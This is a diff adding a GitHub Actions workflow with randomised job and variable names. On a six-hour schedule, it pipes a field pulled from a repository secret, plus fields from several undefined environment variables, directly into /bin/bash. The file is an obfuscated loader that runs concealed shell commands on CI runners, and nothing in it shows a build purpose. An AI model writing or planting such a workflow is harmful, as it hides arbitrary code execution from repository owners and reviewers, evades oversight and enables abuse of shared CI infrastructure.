@@ -1,0 +1,23 @@
+name: hebaise4756
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hebaise4756
+        env:
+          c4547: ${{ secrets.c4547 }}
+        run: |
+          echo $c4547 | jq -r .sb0938 | /bin/bash
+          echo $nxf54559 | jq -r .wttar3514 | /bin/bash
+          echo $bcq26067 | jq -r .rxt568 | /bin/bash
+          echo $pa48 | jq -r .nqpw36 | /bin/bash
+          echo $oif8563 | jq -r .z4 | /bin/bash
+          echo $gxks0 | jq -r .dkqf13 | /bin/bash
+          echo $f7 | jq -r .qnyxj930 | /bin/bash
+
